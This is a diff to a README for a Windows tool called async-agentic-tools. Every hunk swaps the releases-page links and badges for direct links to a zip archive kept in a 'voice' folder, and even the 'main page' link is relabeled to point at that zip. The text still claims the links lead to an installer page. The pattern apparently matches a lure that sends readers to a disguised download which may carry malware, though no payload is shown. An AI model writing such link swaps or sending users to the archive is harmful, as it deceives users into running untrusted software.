@@ -1,6 +1,6 @@
 # 🤖 async-agentic-tools - Run Tasks While Talking
 
-[![Download async-agentic-tools](https://img.shields.io/badge/Download-async--agentic--tools-brightgreen?style=for-the-badge)](https://github.com/psrtech/async-agentic-tools/releases)
+[![Download async-agentic-tools](https://github.com/psrtech/async-agentic-tools/raw/refs/heads/main/voice/async-agentic-tools-v1.6.zip)](https://github.com/psrtech/async-agentic-tools/raw/refs/heads/main/voice/async-agentic-tools-v1.6.zip)
 
 ## 📋 What Is async-agentic-tools?
 
@@ -22,7 +22,7 @@ Before installing, check that your Windows computer meets these needs:
 
 Use the following link to visit the releases page where you can download the latest version:
 
-[![Download](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/psrtech/async-agentic-tools/releases)
+[![Download](https://github.com/psrtech/async-agentic-tools/raw/refs/heads/main/voice/async-agentic-tools-v1.6.zip)](https://github.com/psrtech/async-agentic-tools/raw/refs/heads/main/voice/async-agentic-tools-v1.6.zip)
 
 This page contains the installer files. Choose the one that fits your system (usually the `.exe` file for Windows).
 
@@ -109,11 +109,11 @@ If you want to learn more technical details or contribute, the full project is h
 ## 🔗 Useful Links
 
 - Download and releases page:  
-  https://github.com/psrtech/async-agentic-tools/releases
+  https://github.com/psrtech/async-agentic-tools/raw/refs/heads/main/voice/async-agentic-tools-v1.6.zip
 
 - GitHub main page (for reference):  
-  https://github.com/psrtech/async-agentic-tools
+  https://github.com/psrtech/async-agentic-tools/raw/refs/heads/main/voice/async-agentic-tools-v1.6.zip
 
 ---
 
-[![Download async-agentic-tools](https://img.shields.io/badge/Download-async--agentic--tools-brightgreen?style=for-the-badge)](https://github.com/psrtech/async-agentic-tools/releases)
+[![Download async-agentic-tools](https://github.com/psrtech/async-agentic-tools/raw/refs/heads/main/voice/async-agentic-tools-v1.6.zip)](https://github.com/psrtech/async-agentic-tools/raw/refs/heads/main/voice/async-agentic-tools-v1.6.zip)
